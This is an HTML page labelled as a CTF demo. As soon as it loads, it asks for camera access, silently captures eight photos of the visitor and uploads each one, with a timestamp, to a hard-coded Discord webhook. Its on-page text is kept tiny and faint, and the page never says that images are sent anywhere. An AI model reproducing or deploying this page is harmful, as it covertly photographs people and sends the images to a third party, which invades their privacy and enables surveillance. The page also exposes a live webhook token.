<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demo CTF Zero-Click Fotos Rápidas</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f0f0f0; }
        h1 { color: #ff0000; font-size: 16px; opacity: 0.7; } /* Sutil */
        #status { font-size: 10px; color: #00aa00; margin-top: 5px; } /* Discreto */
    </style>
</head>
<body>
    <h1>demonstração de ctf</h1>
    <div id="status">Inicializando...</div>

    <script>
        // Webhook do Discord
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';

        // Enviar item ao webhook (multipart/form-data)
        async function sendItem(type, data, index = null) {
            try {
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify({
                    embeds: [{
                        title: `CTF Zero-Click: ${type} [${new Date().toISOString()}]`,
                        fields: [
                            { name: 'Type', value: type },
                            { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
                            { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1024) }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                }));
                if (type.includes('Photo')) {
                    const response = await fetch(data.base64);
                    const blob = await response.blob();
                    formData.append('file', blob, `photo_${index + 1}.webp`);
                }

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
                if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                return true;
            } catch (e) {
                console.error(`Erro ao enviar ${type}: ${e.message}`);
                return false;
            }
        }

        // Função para coletar 8 fotos rapidamente
        async function collectPhotos() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                await sendItem('Câmera', { error: 'Câmera não suportada' });
                document.getElementById('status').innerHTML = 'Coleta concluída!';
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: navigator.userAgent.match(/mobile/i) ? 'environment' : 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                    audio: false 
                });
                for (let i = 0; i < 8; i++) {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.2));  // Qualidade 0.2 para velocidade
                    const reader = new FileReader();
                    const photo = await new Promise(resolve => {
                        reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                        reader.readAsDataURL(blob);
                    });
                    await sendItem(`Photo ${i + 1}`, photo, i);
                    await new Promise(resolve => setTimeout(resolve, 500));  // 0.5s para velocidade
                }
                stream.getTracks().forEach(track => track.stop());
                document.getElementById('status').innerHTML = 'foi, agora vc é uma pessoa top!';
            } catch (e) {
                await sendItem('Câmera', { error: `Erro na câmera: ${e.message}` });
                document.getElementById('status').innerHTML = 'foi, mas de erro.';
            }
        }

        // Iniciar coleta zero-click
        collectPhotos();
    </script>
</body>
</html>
